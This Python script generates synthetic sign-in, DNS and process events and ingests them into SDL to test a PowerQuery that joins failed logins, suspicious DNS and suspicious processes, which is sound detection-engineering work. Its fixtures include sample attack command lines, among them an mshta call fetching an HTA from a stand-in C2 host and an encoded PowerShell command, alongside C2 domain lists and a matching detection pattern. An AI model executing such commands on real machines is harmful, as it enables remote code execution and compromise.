"""Ingest realistic events to SDL to exercise the 3-way join PowerQuery:

  identity sign_in failures  x  suspicious DNS  x  suspicious process_start

Joined on (user_name) and (host). Events are spread across the last 4 hours.
"""
from __future__ import annotations

import random
import time
from pathlib import Path
import sys

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))
from sdl_client import add_events, power_query  # noqa: E402

NOW_MS = int(time.time() * 1000)
WINDOW_MS = 4 * 60 * 60 * 1000  # 4h

# --- Personas that will land in ALL 3 streams (these will join) --------------
JOIN_TARGETS = [
    # (user, host)
    ("alice.smith",   "wks-alice-01"),
    ("bob.jones",     "wks-bob-02"),
    ("carol.nguyen",  "wks-carol-03"),
]

# Users that only fail logins (no DNS/proc match)  → in failed-only
NOISE_FAILED_USERS = ["dave.kim", "erin.lopez", "frank.singh"]

# Hosts that have suspicious procs but no DNS hit → noise on proc side
NOISE_PROC_HOSTS = ["srv-build-01", "srv-jenkins-02"]

SUSPECT_DOMAINS = ["c2.example.net", "suspect.example.org", "c2.example.io"]
BENIGN_DOMAINS  = ["microsoft.com", "google.com", "github.com"]
SUSPECT_CMDS = [
    "powershell.exe -enc SQBFAFgAIA==",
    "rundll32.exe shell32.dll,Control_RunDLL",
    "mshta.exe http://c2.example.net/x.hta",
]
BENIGN_CMDS = ["explorer.exe", "chrome.exe --no-sandbox", "code.exe"]


def rand_ts() -> str:
    """Random ns-epoch timestamp string within the last 4h."""
    ms = NOW_MS - random.randint(0, WINDOW_MS - 1)
    return str(ms * 1_000_000)


def evt(ts_ns: str, attrs: dict) -> dict:
    return {"ts": ts_ns, "sev": 3, "attrs": attrs, "thread": "T1"}


def gen_failed_signins() -> list[dict]:
    out = []
    # Users in JOIN_TARGETS get many failures (so they "stand out")
    for user, _ in JOIN_TARGETS:
        for _ in range(random.randint(8, 15)):
            out.append(evt(rand_ts(), {
                "dataSource.category": "identity",
                "dataSource.vendor":   "azure-ad",
                "activity_name":       "sign_in",
                "status":              "failure",
                "user.name":           user,
                "src_endpoint.ip":     f"203.0.113.{random.randint(2,254)}",
            }))
    # Noise: failed-only users
    for user in NOISE_FAILED_USERS:
        for _ in range(random.randint(2, 6)):
            out.append(evt(rand_ts(), {
                "dataSource.category": "identity",
                "dataSource.vendor":   "azure-ad",
                "activity_name":       "sign_in",
                "status":              "failure",
                "user.name":           user,
            }))
    # Some successes (should be filtered out by status='failure')
    for user, _ in JOIN_TARGETS:
        for _ in range(3):
            out.append(evt(rand_ts(), {
                "dataSource.category": "identity",
                "dataSource.vendor":   "azure-ad",
                "activity_name":       "sign_in",
                "status":              "success",
                "user.name":           user,
            }))
    return out


def gen_dns() -> list[dict]:
    out = []
    for user, host in JOIN_TARGETS:
        # suspicious DNS for these users on their hosts
        for _ in range(random.randint(3, 6)):
            out.append(evt(rand_ts(), {
                "dataSource.category": "network",
                "dataSource.vendor":   "zeek",
                "activity_name":       "dns_query",
                "user.name":           user,
                "device.hostname":     host,
                "dns.question.name":   random.choice(SUSPECT_DOMAINS),
            }))
        # benign DNS noise from same users
        for _ in range(5):
            out.append(evt(rand_ts(), {
                "dataSource.category": "network",
                "dataSource.vendor":   "zeek",
                "activity_name":       "dns_query",
                "user.name":           user,
                "device.hostname":     host,
                "dns.question.name":   random.choice(BENIGN_DOMAINS),
            }))
    # Noise: suspicious DNS for users NOT in JOIN_TARGETS (won't join failed)
    for user in ["greg.wu", "helen.park"]:
        for _ in range(3):
            out.append(evt(rand_ts(), {
                "dataSource.category": "network",
                "dataSource.vendor":   "zeek",
                "activity_name":       "dns_query",
                "user.name":           user,
                "device.hostname":     f"wks-{user.split('.')[0]}-99",
                "dns.question.name":   random.choice(SUSPECT_DOMAINS),
            }))
    return out


def gen_process() -> list[dict]:
    out = []
    for _, host in JOIN_TARGETS:
        for _ in range(random.randint(4, 8)):
            out.append(evt(rand_ts(), {
                "dataSource.category": "process",
                "dataSource.vendor":   "sentinelone",
                "activity_name":       "process_start",
                "device.hostname":     host,
                "process.cmd_line":    random.choice(SUSPECT_CMDS),
            }))
        # benign procs on the same hosts
        for _ in range(5):
            out.append(evt(rand_ts(), {
                "dataSource.category": "process",
                "dataSource.vendor":   "sentinelone",
                "activity_name":       "process_start",
                "device.hostname":     host,
                "process.cmd_line":    random.choice(BENIGN_CMDS),
            }))
    # Noise: suspicious procs on hosts that don't appear in DNS stream
    for host in NOISE_PROC_HOSTS:
        for _ in range(3):
            out.append(evt(rand_ts(), {
                "dataSource.category": "process",
                "dataSource.vendor":   "sentinelone",
                "activity_name":       "process_start",
                "device.hostname":     host,
                "process.cmd_line":    random.choice(SUSPECT_CMDS),
            }))
    return out


def chunked(seq: list, n: int):
    for i in range(0, len(seq), n):
        yield seq[i:i + n]


def main() -> None:
    random.seed(42)
    events = gen_failed_signins() + gen_dns() + gen_process()
    random.shuffle(events)
    print(f"Generated {len(events)} events across the last 4h")

    sent = 0
    for batch in chunked(events, 200):
        r = add_events(batch, session_info={
            "serverHost": "join-demo",
            "logfile":    "join-demo.jsonl",
            "parser":     "json",
        })
        if r.get("status") != "success":
            raise RuntimeError(f"addEvents failed: {r}")
        sent += len(batch)
        print(f"  ingested {sent}/{len(events)}")
        time.sleep(0.25)
    print(f"Done. {sent} events ingested.")

    # Quick verification: run the user's PowerQuery against last 4h
    pq = r'''| join
    failed = (
      dataSource.category = 'identity' AND activity_name = 'sign_in' AND status = 'failure'
      | columns user_name = user.name
      | group failed_signins = count() by user_name
    ),
    dns = (
      dataSource.category = 'network' AND activity_name = 'dns_query'
      AND dns.question.name matches "(c2|suspect)\.example\."
      | columns user_name = user.name, host = device.hostname, dns_name = dns.question.name
    ),
    proc = (
      dataSource.category = 'process' AND activity_name = 'process_start'
      AND process.cmd_line matches "(powershell|rundll32|mshta)"
      | columns host = device.hostname, cmd_line = process.cmd_line
    )
    on failed.user_name = dns.user_name, dns.host = proc.host'''

    print("\nWaiting 20s for SDL indexing, then running the join...")
    time.sleep(20)
    res = power_query(pq, start_time="4h")
    if isinstance(res, dict):
        matches = res.get("matches") or res.get("data") or res.get("results")
        print(f"PowerQuery response keys: {list(res.keys())}")
        if matches is not None:
            print(f"Match count: {len(matches) if hasattr(matches, '__len__') else matches}")
        else:
            print(res)
    else:
        print(res)


if __name__ == "__main__":
    main()
